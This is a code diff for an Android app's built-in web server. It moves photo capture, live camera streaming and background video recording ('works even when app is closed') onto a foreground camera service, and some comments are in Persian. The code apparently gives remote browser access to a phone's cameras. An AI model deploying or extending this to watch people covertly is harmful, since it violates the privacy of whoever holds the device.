@@ -852,250 +852,292 @@ private Response serveLocations() {
 
     // ============ Camera Methods ============
 
-    private Response serveCameraPage() {
-        StringBuilder html = new StringBuilder(HTML_HEADER);
-        html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");
+private Response serveCameraPage() {
+    StringBuilder html = new StringBuilder(HTML_HEADER);
+    html.append("<div class=\"card\">");
+    html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");
 
-        // Check permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
-                html.append("<p>Camera permission not granted.</p>");
-                html.append(
-                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
-                html.append("</div>");
-                html.append("</div>");
-                html.append(HTML_FOOTER);
-                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
-            }
+    // Check permission
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+            html.append("<p>Camera permission not granted.</p>");
+            html.append(
+                    "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
+            html.append("</div>");
+            html.append("</div>");
+            html.append(HTML_FOOTER);
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
         }
+    }
 
-        // List available cameras using CameraHelper
-        CameraHelper cameraHelper = new CameraHelper(context);
-        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
+    // List available cameras using CameraService (NOT CameraHelper)
+    java.util.List<CameraService.CameraInfo> cameras = new ArrayList<>();
+    CameraService cameraService = CameraService.getInstance();
+    if (cameraService != null) {
+        cameras = cameraService.getAvailableCameras();
+    }
 
-        if (cameras.isEmpty()) {
-            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
-            html.append("<p>No cameras available</p>");
-            html.append("</div>");
-        } else {
-            // Photo Capture Section
-            html.append("<div class=\"info-section\">");
-            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
-            html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
-            html.append(
-                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
+    if (cameras.isEmpty()) {
+        html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
+        html.append("<p>No cameras available or CameraService not started</p>");
+        html.append("</div>");
+    } else {
+        // Photo Capture Section
+        html.append("<div class=\"info-section\">");
+        html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
+        html.append(
+                "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
+        html.append(
+                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
 
-            for (CameraHelper.CameraInfo cam : cameras) {
-                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
-                String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
-                String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
-                String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";
+        for (CameraService.CameraInfo cam : cameras) {
+            String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
+            String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
+            String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
+            String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";
 
-                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
-                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
-                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
-                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
-                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
-                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
-                        .append(cam.facing).append(" Camera</div>");
-                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
-                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
-                html.append("</a>");
-            }
-            html.append("</div>");
-            html.append("</div>");
+            html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
+            html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
+            html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
+            html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
+            html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
+            html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
+                    .append(cam.facing).append(" Camera</div>");
+            html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
+                    .append(cam.width).append(" x ").append(cam.height).append("</div>");
+            html.append("</a>");
+        }
+        html.append("</div>");
+        html.append("</div>");
 
-            // Live Streaming Section
-            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
-            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
-            html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
-            html.append(
-                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
+        // Live Streaming Section
+        html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
+        html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
+        html.append(
+                "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
+        html.append(
+                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
 
-            for (CameraHelper.CameraInfo cam : cameras) {
-                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
-                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
-                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
-                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
-                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
-                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
-                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
-                        .append("</div>");
-                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
-                html.append("</a>");
-            }
-            html.append("</div>");
-            html.append("</div>");
+        for (CameraService.CameraInfo cam : cameras) {
+            String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
+            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
+            html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
+            html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
+            html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
+            html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
+            html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
+                    .append("</div>");
+            html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
+            html.append("</a>");
+        }
+        html.append("</div>");
+        html.append("</div>");
 
-            // Video Recording Section
-            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
-            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
-            html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
-            html.append(
-                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
-            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
+        // Video Recording Section
+        html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
+        html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
+        html.append(
+                "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
+        html.append(
+                "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
+        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
 
-            for (CameraHelper.CameraInfo cam : cameras) {
-                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
-                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
-                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
-                html.append("&#127909; Record ").append(cam.facing);
-                html.append("</button>");
-            }
-
-            html.append("<button onclick=\"stopRecording()\" ");
-            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
+        for (CameraService.CameraInfo cam : cameras) {
+            html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
+            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
             html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
-            html.append("&#9632; Stop Recording");
+            html.append("&#127909; Record ").append(cam.facing);
             html.append("</button>");
-            html.append("</div>");
-
-            // JavaScript for recording
-            html.append("<script>");
-            html.append("function startRecording(camId) {");
-            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
-            html.append(
-                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
-            html.append("  });");
-            html.append("}");
-            html.append("function stopRecording() {");
-            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
-            html.append(
-                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
-            html.append("  });");
-            html.append("}");
-            html.append("function checkRecStatus() {");
-            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
-            html.append("    if (d.recording) {");
-            html.append(
-                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
-            html.append("    } else {");
-            html.append(
-                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
-            html.append("    }");
-            html.append("  });");
-            html.append("}");
-            html.append("checkRecStatus();");
-            html.append("setInterval(checkRecStatus, 2000);");
-            html.append("</script>");
-
-            html.append("</div>");
         }
+
+        html.append("<button onclick=\"stopRecording()\" ");
+        html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
+        html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
+        html.append("&#9632; Stop Recording");
+        html.append("</button>");
+        html.append("</div>");
+
+        // JavaScript for recording
+        html.append("<script>");
+        html.append("function startRecording(camId) {");
+        html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
+        html.append(
+                "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
+        html.append("  });");
+        html.append("}");
+        html.append("function stopRecording() {");
+        html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
+        html.append(
+                "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
+        html.append("  });");
+        html.append("}");
+        html.append("function checkRecStatus() {");
+        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
+        html.append("    if (d.recording) {");
+        html.append(
+                "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
+        html.append("    } else {");
+        html.append(
+                "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
+        html.append("    }");
+        html.append("  });");
+        html.append("}");
+        html.append("checkRecStatus();");
+        html.append("setInterval(checkRecStatus, 2000);");
+        html.append("</script>");
 
         html.append("</div>");
-        html.append(HTML_FOOTER);
-
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
-    private Response serveCameraCapture(Map<String, String> params) {
-        String cameraId = params.get("cam");
-        if (cameraId == null || cameraId.isEmpty()) {
-            cameraId = "0"; // Default to back camera
+    html.append("</div>");
+    html.append(HTML_FOOTER);
+
+    return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+}
+private Response serveCameraCapture(Map<String, String> params) {
+    String cameraId = params.get("cam");
+    if (cameraId == null || cameraId.isEmpty()) {
+        cameraId = "0"; // Default to back camera
+    }
+
+    StringBuilder html = new StringBuilder(HTML_HEADER);
+    html.append("<div class=\"card\">");
+    html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");
+
+    // Check permission
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+            html.append("<p>Camera permission not granted.</p>");
+            html.append("</div>");
+            html.append("</div>");
+            html.append(HTML_FOOTER);
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+        }
+    }
+
+    try {
+        // استفاده از CameraService به جای CameraHelper
+        Intent intent = new Intent(context, CameraService.class);
+        intent.setAction("CAPTURE_PHOTO");
+        intent.putExtra("cameraId", cameraId);
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+        
+        // منتظر موندن برای عکس (حداکثر 10 ثانیه)
+        byte[] imageData = null;
+        for (int i = 0; i < 20; i++) {
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+                break;
+            }
+            imageData = CameraService.waitForPhoto(500);
+            if (imageData != null) break;
         }
 
-        StringBuilder html = new StringBuilder(HTML_HEADER);
-        html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");
+        if (imageData != null && imageData.length > 0) {
+            String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
 
-        // Check permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
-                html.append("<p>Camera permission not granted.</p>");
-                html.append("</div>");
-                html.append("</div>");
-                html.append(HTML_FOOTER);
-                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
-            }
-        }
+            html.append("<div style=\"text-align: center;\">");
+            html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
+            html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
+            html.append("</div>");
 
-        try {
-            CameraHelper cameraHelper = new CameraHelper(context);
-            byte[] imageData = cameraHelper.capturePhoto(cameraId);
-
-            if (imageData != null && imageData.length > 0) {
-                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
-
-                html.append("<div style=\"text-align: center;\">");
-                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
-                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
-                html.append("</div>");
-
-                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
-                html.append(
-                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
-                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
-                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
-                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
-                        "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">&#128247; Capture Again</a>");
-                html.append("</div>");
-
-            } else {
-                String error = cameraHelper.getLastError();
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
-                html.append("<p>Failed to capture photo</p>");
-                if (error != null) {
-                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
-                            .append(escapeHtml(error)).append("</p>");
-                }
-                html.append(
-                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
-                html.append("</div>");
-            }
-
-        } catch (Exception e) {
-            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
-            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
+            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
             html.append(
-                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
+                    "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">← Back to Camera</a>");
+            html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
+                    "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">↓ Download Photo</a>");
+            html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
+                    "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">📸 Capture Again</a>");
+            html.append("</div>");
+
+        } else {
+            String error = CameraService.getLastCaptureError();
+            html.append("<div class=\"empty-state\"><div class=\"icon\">⚠️</div>");
+            html.append("<p>Failed to capture photo</p>");
+            if (error != null) {
+                html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
+                        .append(escapeHtml(error)).append("</p>");
+            } else {
+                html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">Timeout or CameraService not responding</p>");
+            }
+            html.append(
+                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">← Back to Camera</a>");
             html.append("</div>");
         }
 
+    } catch (Exception e) {
+        html.append("<div class=\"empty-state\"><div class=\"icon\">⚠️</div>");
+        html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
+        html.append(
+                "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">← Back to Camera</a>");
         html.append("</div>");
-        html.append(HTML_FOOTER);
-
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
-    private Response serveCameraPhoto(Map<String, String> params) {
-        String cameraId = params.get("cam");
-        if (cameraId == null || cameraId.isEmpty()) {
-            cameraId = "0";
-        }
+    html.append("</div>");
+    html.append(HTML_FOOTER);
 
-        // Check permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                return serveError("Camera permission not granted");
-            }
-        }
+    return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+}
+private Response serveCameraPhoto(Map<String, String> params) {
+    String cameraId = params.get("cam");
+    if (cameraId == null || cameraId.isEmpty()) {
+        cameraId = "0";
+    }
 
-        try {
-            CameraHelper cameraHelper = new CameraHelper(context);
-            byte[] imageData = cameraHelper.capturePhoto(cameraId);
-
-            if (imageData != null && imageData.length > 0) {
-                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
-                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
-                response.addHeader("Content-Disposition",
-                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
-                return response;
-            } else {
-                String error = cameraHelper.getLastError();
-                return serveError(error != null ? error : "Failed to capture photo");
-            }
-
-        } catch (Exception e) {
-            return serveError("Error capturing photo: " + e.getMessage());
+    // Check permission
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            return serveError("Camera permission not granted");
         }
     }
 
+    try {
+        // استفاده از CameraService به جای CameraHelper
+        Intent intent = new Intent(context, CameraService.class);
+        intent.setAction("CAPTURE_PHOTO");
+        intent.putExtra("cameraId", cameraId);
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+        
+        // منتظر موندن برای عکس (حداکثر 10 ثانیه)
+        byte[] imageData = null;
+        for (int i = 0; i < 20; i++) {
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+                break;
+            }
+            imageData = CameraService.waitForPhoto(500);
+            if (imageData != null) break;
+        }
+
+        if (imageData != null && imageData.length > 0) {
+            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
+            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
+            response.addHeader("Content-Disposition",
+                    "attachment; filename=\"photo_" + System.currentTimeMillis() + ".jpg\"");
+            return response;
+        } else {
+            String error = CameraService.getLastCaptureError();
+            return serveError(error != null ? error : "Failed to capture photo - timeout");
+        }
+
+    } catch (Exception e) {
+        return serveError("Error capturing photo: " + e.getMessage());
+    }
+}
     // ============ LIVE STREAMING ============
 
     private Response serveLiveStreamPage(Map<String, String> params) {
